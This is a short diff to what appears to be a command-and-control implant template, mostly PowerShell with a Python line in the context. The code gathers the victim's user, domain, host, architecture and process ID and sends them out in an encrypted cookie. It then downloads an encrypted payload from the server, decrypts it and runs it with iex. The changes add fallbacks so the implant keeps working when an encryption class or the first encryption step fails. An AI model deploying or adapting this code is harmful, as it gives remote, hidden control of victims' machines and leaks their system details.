@@ -75,7 +75,8 @@ res=urllib2.urlopen(r);html=res.read();x=decrypt(key, html).rstrip('\\0');exec(x
 $sc="%s"
 $s="%s"
 function CAM ($key,$IV){
-$a = New-Object -TypeName "System.Security.Cryptography.RijndaelManaged"
+try {$a = New-Object "System.Security.Cryptography.RijndaelManaged"
+} catch {$a = New-Object "System.Security.Cryptography.AesCryptoServiceProvider"}
 $a.Mode = [System.Security.Cryptography.CipherMode]::CBC
 $a.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
 $a.BlockSize = 128
@@ -140,7 +141,7 @@ $wc }
 function primer {
 try{$u=([Security.Principal.WindowsIdentity]::GetCurrent()).name} catch{if ($env:username -eq "$($env:computername)$"){}else{$u=$env:username}}
 $o="$env:userdomain;$u;$env:computername;$env:PROCESSOR_ARCHITECTURE;$pid;%s"
-$pp=enc -key %s -un $o
+try {$pp=enc -key %s -un $o} catch {$pp="ERROR"}
 $primer = (Get-Webclient -Cookie $pp).downloadstring($s)
 $p = dec -key %s -enc $primer
 if ($p -like "*key*") {$p| iex}
